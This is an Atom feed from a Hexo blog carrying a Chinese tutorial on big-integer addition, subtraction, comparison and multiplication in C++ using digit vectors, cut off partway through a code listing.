<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>m-Onst</title>
  
  <subtitle>Hi~ o(*￣▽￣*)ブ</subtitle>
  <link href="https://4st.tech/atom.xml" rel="self"/>
  
  <link href="https://4st.tech/"/>
  <updated>2021-08-08T12:05:51.078Z</updated>
  <id>https://4st.tech/</id>
  
  <author>
    <name>iforget</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>基础算法：高精度大整数运算</title>
    <link href="https://4st.tech/2021/08/08/ji-chu-suan-fa-gao-jing-du-da-zheng-shu-yun-suan/"/>
    <id>https://4st.tech/2021/08/08/ji-chu-suan-fa-gao-jing-du-da-zheng-shu-yun-suan/</id>
    <published>2021-08-08T11:48:36.000Z</published>
    <updated>2021-08-08T12:05:51.078Z</updated>
    
    <content type="html"><![CDATA[<h1 id="高精度大整数运算">高精度大整数运算</h1><p>只针对C++来说，因为C++没有大整数类，而java具有大整数类，python的整数是无限位的</p><p>对于大数运算，一般有以下几种情况：</p><ul><li><span class="math inline">\(A + B\)</span>型，其中这两个的位数大概在<span class="math inline">\(10^6\)</span></li><li><span class="math inline">\(A - B\)</span>型，其中这两个的位数大概在<span class="math inline">\(10^6\)</span></li><li><span class="math inline">\(A \times \alpha\)</span>，其中A的长度不超过<span class="math inline">\(10^6\)</span>，<span class="math inline">\(\alpha\)</span>是一个小整数，不超过<span class="math inline">\(10^5\)</span></li><li><span class="math inline">\(A \times B\)</span>型，两个都是超长的整数，但是面试时要让写的概率不大</li><li><span class="math inline">\(\frac{A}{B}\)</span>型，两个都是超长的正数，面试时让写的概率不大</li></ul><h1 id="基本思想">基本思想</h1><h2 id="大整数的存储">大整数的存储</h2><p>由于位数较多，一个int变量根本存放不下（可表示的最大整数是2147483647，共10位，并不能存放的下），所以可以使用数组来进行存放。</p><p>在使用数组存放的时候就有一个问题，采用小端方式还是大端方式存放，哪一个对要做的高精度整数运算更加方便呢？比较建议的是使用小端方式，即：低地址（数组下标0开始）存放个位，然后依次往后存放高位。</p><p>采用小端方式存放的原因是，在做运算时会有进位，如果从数组下标0开始依次存放大整数的个位的话，方便进位操作。因为<strong>可能会出现需要在高位补上额外的一个1，对于数组来说，在下标0处添加高位进位还需要将后面的数依次向后移动一个位置，降低了效率</strong>；而在最后面补上进位的话就方便许多，并不需要进行移位操作。</p><p>由于可能会出现混合运算，因此对于大整数的加减乘除都需要保证存储格式要一致。</p><h2 id="大整数的运算">大整数的运算</h2><p>其实本质上就是模拟小学学过的竖式运算。</p><p>要注意，本专题讨论的大整数运算的前提是两个大整数都是非负数，即：<span class="math inline">\(A \ge 0, B\ge 0\)</span>。如果不都是非负数，则是输入输出的问题了。</p><h3 id="大整数加法">大整数加法</h3><p>竖式加法运算的步骤：</p><ol type="1"><li>个位与个位相加，如果计算结果大于10，则向前进位，并对10取余（模），得到最终结果的个位应该存放的值</li><li>然后是十位与十位相加，并加上进位。如果计算结果大于10，继续向前进位，并对10取余，得到最终结果的十位应该存放的值</li><li>重复上述操作，直到计算完毕</li></ol><p>观察上述计算步骤，其实是三个数在做加法：两个位置的数相加再加上进位得到结果。</p><h3 id="大整数减法">大整数减法</h3><p>竖式减法运算的步骤：</p><ol type="1"><li>个位与个位相减，如果不够减，则向前借一位，即：被减数的个位 + 10 - 减数的个位；被减数的十位要减去1</li><li>然后轮到十位进行上述运算</li><li>重复上述操作，直到计算完毕</li></ol><p>上述运算步骤其实是三个数在参与运算：</p><ul><li>如果没有借位的话，则是<span class="math inline">\(A_i - B_i + Carry\)</span>，此时借位<code>carry</code>为0</li><li>如果有借位的话，则是<span class="math inline">\(A_i + Carry - B_i\)</span>，此时借位<code>carry</code>为10</li></ul><p>因此，做大整数减法的话是要分两个步骤</p><ol type="1"><li>如果A小于B，则计算<span class="math inline">\(-(B - A)\)</span>。即，先交换做减法，后补上一个负号</li><li>如果A不小于B，则直接做减法即可</li></ol><h3 id="大整数乘法">大整数乘法</h3><p>与加减法的比较类似，只需要找到其中几个关键点：</p><ul><li>进位的值等于<span class="math inline">\(carry = \lfloor (A[i] \times B) / 10 \rfloor\)</span></li><li>当前位的值<span class="math inline">\((A[i] \times B)\% 10\)</span></li><li>高位的值为<span class="math inline">\((A[i+1] \times B + carry) % 10\)</span></li></ul><p>需要注意的是，它是用A的每一位整体乘以的B，所以要求B不能太大，<code>int</code>能存放的下才行。</p><h3 id="大整数除法">大整数除法</h3><p>前提是高精度的整数除以低精度的整数，与大整数乘法的要求差不多。</p><p>回顾除法的竖式计算，设余数为r，被除数为A，除数为b，商为q，则有：<span class="math inline">\(q = (r * 10 + A[i]) / b,r = (r * 10 + A[i]) \% 10\)</span>。简单的来说就是：</p><ul><li>商等于高精度整数A的当前位加上余数乘以10除以除数。也就是列竖式中第二步中，高位的商求出来后，继续进行下一步的运算时的落式运算</li><li>求落式运算中，做完减法剩下来的余数的高位是多少</li></ul><p>为了统一操作，高精度整数的加减乘除都使用哨兵，记初始状态的进位为0，从而可以省略了分支结构。</p><p>需要注意的是：</p><ul><li>大整数除法是从高位开始的，而其他三种运算都是从低位开始做运算的</li><li>由于大整数除法是从高位开始做运算的，因此为了统一大整数的存储格式，其最后运算的结果要使用<code>reverse(vector.begin(), vector.end())</code>来做逆置操作</li></ul><h1 id="算法模板">算法模板</h1><h2 id="大整数加法-1">大整数加法</h2><h3 id="迭代式">迭代式</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A &gt;= 0, B &gt;= 0</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">add</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 由于没有判断A和B哪个位数更长，而加法运算需要对每一个数位上的值都要加上一遍</span></span><br><span class="line">    <span class="comment">// 因此不能提前退出，使用或条件</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || i &lt; B.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> result = carry;</span><br><span class="line">        <span class="comment">// 当要加上的整数还没运算完时，加上对应的位置上的整数</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            result += A[i];            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            result += B[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对10取模，得到该位置上的值</span></span><br><span class="line">        ans.<span class="built_in">push_back</span>(result % <span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 计算进位</span></span><br><span class="line">        carry = result / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当还有进位的时候，证明需要在最高位补上一个1</span></span><br><span class="line">    <span class="keyword">if</span> (carry) &#123;</span><br><span class="line">        ans.<span class="built_in">push_back</span>(carry);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递归式">递归式</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">add</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">      <span class="comment">// 让竖式计算的最上面的那个整数是最长的</span></span><br><span class="line">      <span class="keyword">if</span> (A.<span class="built_in">size</span>() &lt; B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">add</span>(B, A);</span><br><span class="line">      &#125;    </span><br><span class="line">            </span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> result = carry +  A[i];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 当要加上的整数还没运算完时，加上对应的位置上的整数</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            result += B[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对10取模，得到该位置上的值</span></span><br><span class="line">        ans.<span class="built_in">push_back</span>(result % <span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 计算进位</span></span><br><span class="line">        carry = result / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 当还有进位的时候，证明需要在最高位补上一个1</span></span><br><span class="line">    <span class="keyword">if</span> (carry) &#123;</span><br><span class="line">        ans.<span class="built_in">push_back</span>(carry);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="大整数减法-1">大整数减法</h2><h3 id="比较两个大整数谁大">比较两个大整数谁大</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比较大整数A是否不小于大整数B</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A.<span class="built_in">size</span>() != B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> A.<span class="built_in">size</span>() &gt;= B.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 这三个连续的if可以做优化，合并掉多余的操作</span></span><br><span class="line">        <span class="keyword">if</span> (A[i] == B[i]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (A[i] &gt; B[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>for</code>循环遍历的优化写法，省掉了多个分支判断：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比较大整数A是否不小于大整数B</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A.<span class="built_in">size</span>() != B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> A.<span class="built_in">size</span>() &gt;= B.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 根据上面的分支情况，可以归结为，当两个值不等时，比较它俩的大小</span></span><br><span class="line">        <span class="comment">// 因此可以写成下面的这种情况</span></span><br><span class="line">        <span class="keyword">if</span> (A[i] != B[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> A[i] &gt; B[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="大整数减法模板">大整数减法模板</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 先利用大整数比较，来将问题转为A - B的情况</span></span><br><span class="line"><span class="comment">vector&lt;int&gt; ans;</span></span><br><span class="line"><span class="comment">// 比较A是否不小于大整数B</span></span><br><span class="line"><span class="comment">if (cmp(A, B) == true) &#123;</span></span><br><span class="line"><span class="comment">    ans = sub(A, B);</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">&#125; else &#123;</span></span><br><span class="line"><span class="comment">    ans = sub(B, A);</span></span><br><span class="line"><span class="comment">    printf(&quot;-&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sub</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// A一定不小于B，初始时，没有借位</span></span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="comment">// 初始时是个位进行相减，假设当前并没有借位，所以初始的借位值carry为0</span></span><br><span class="line">        <span class="keyword">int</span> tmp = A[i] - carry;</span><br><span class="line">        <span class="comment">// 当B还没减完时，需要继续减，变为A[i] - B[i]</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            tmp = tmp - B[i]; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当A[i] - B[i]的值小于0时，则A[i + 1]需要减去1</span></span><br><span class="line">        <span class="comment">// 因此需要将借位标志carry记为1，在下次循环时将借位减掉</span></span><br><span class="line">        <span class="comment">// 下列分支其实可以进行优化</span></span><br><span class="line">        <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            carry = <span class="number">1</span>;</span><br><span class="line">            ans.<span class="built_in">push_back</span>((tmp + <span class="number">10</span>) % <span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            carry = <span class="number">0</span>;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(tmp % <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果高位都是0，则要将这些前导0都要删掉，如果最后结果就是0，则最后一个0不能弹出</span></span><br><span class="line">    <span class="keyword">while</span> (ans.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; ans.<span class="built_in">back</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        ans.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述将两个数的各个位相减后的结果存储在结果数组中时，使用了分支结构。根据其功能以及取模操作%的数学含义，其实可以将上述分支取消掉，只保留计算借位标志carry的分支即可，变为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 先利用大整数比较，来将问题转为A - B的情况</span></span><br><span class="line"><span class="comment">vector&lt;int&gt; ans;</span></span><br><span class="line"><span class="comment">// 比较A是否不小于大整数B</span></span><br><span class="line"><span class="comment">if (cmp(A, B) == true) &#123;</span></span><br><span class="line"><span class="comment">    ans = sub(A, B);</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">&#125; else &#123;</span></span><br><span class="line"><span class="comment">    ans = sub(B, A);</span></span><br><span class="line"><span class="comment">    printf(&quot;-&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sub</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// A一定不小于B，初始时，没有借位</span></span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="comment">// 初始时是个位进行相减，假设当前并没有借位，所以初始的借位值carry为0</span></span><br><span class="line">        <span class="keyword">int</span> tmp = A[i] - carry;</span><br><span class="line">        <span class="comment">// 当B还没减完时，需要继续减，变为A[i] - B[i]</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            tmp = tmp - B[i]; </span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">// 当tmp &lt; 0 时，加上10取余没毛病；</span></span><br><span class="line">       <span class="comment">// 当tmp &gt;= 0时，由于10 % 10 == 0，所以不影响最终结果</span></span><br><span class="line">       <span class="comment">// 故存放的还是tmp % 10其本身，所以可以去掉那个分支结构</span></span><br><span class="line">       ans.<span class="built_in">push_back</span>((tmp + <span class="number">10</span>) % <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当A[i] - B[i]的值小于0时，则A[i + 1]需要减去1</span></span><br><span class="line">        <span class="comment">// 因此需要将借位标志carry记为1，在下次循环时将借位减掉</span></span><br><span class="line">        <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            carry = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            carry = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果高位都是0，则要将这些前导0都要删掉，如果最后结果就是0，则最后一个0不能弹出</span></span><br><span class="line">    <span class="keyword">while</span> (ans.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; ans.<span class="built_in">back</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        ans.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="大整数乘法-1">大整数乘法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">mul</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> <span class="keyword">int</span>&amp; B)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 当A的各个位都已经乘完乘数后，如果还有进位</span></span><br><span class="line">    <span class="comment">// 则将进位的整数分解成若干个整数存放到答案数组中</span></span><br><span class="line">    <span class="comment">// 因为A[i] * B的进位可以不只是1位数，可能是多位的整数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || result; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            result += A[i] * B;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 求当前位置上应该留下的值</span></span><br><span class="line">        ans.<span class="built_in">push_back</span>(result % <span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 求进位了多少值，与加法的很类似，但是加法最多进位是1</span></span><br><span class="line">        <span class="comment">// 而大整数乘法它的进位不一定是1，可能是具有若干个位的整数</span></span><br><span class="line">        result = result / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果B为0，则需要将前导0去除，其实这个特殊情况可以放到函数入口处先判断</span></span><br><span class="line">    <span class="comment">// 可以不进入那个循环，提升效率</span></span><br><span class="line">    <span class="keyword">while</span> (ans.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; ans.<span class="built_in">back</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        ans.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上述代码优化后，可以提升效率：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">mul</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> <span class="keyword">int</span>&amp; B)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    <span class="keyword">if</span> (B == <span class="number">0</span>) &#123;</span><br><span class="line">        ans.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 当A的各个位都已经乘完乘数后，如果还有进位</span></span><br><span class="line">    <span class="comment">// 则将进位的整数分解成若干个整数存放到答案数组中</span></span><br><span class="line">    <span class="comment">// 因为A[i] * B的进位可以不只是1位数，可能是多位的整数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || result; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            result += A[i] * B;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 求当前位置上应该留下的值</span></span><br><span class="line">        ans.<span class="built_in">push_back</span>(result % <span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 求进位了多少值</span></span><br><span class="line">        result = result / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的for循环的终止条件使用了一个或条件，其为了省略一个循环，如果不添加或条件，需要额外添加一个循环如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span 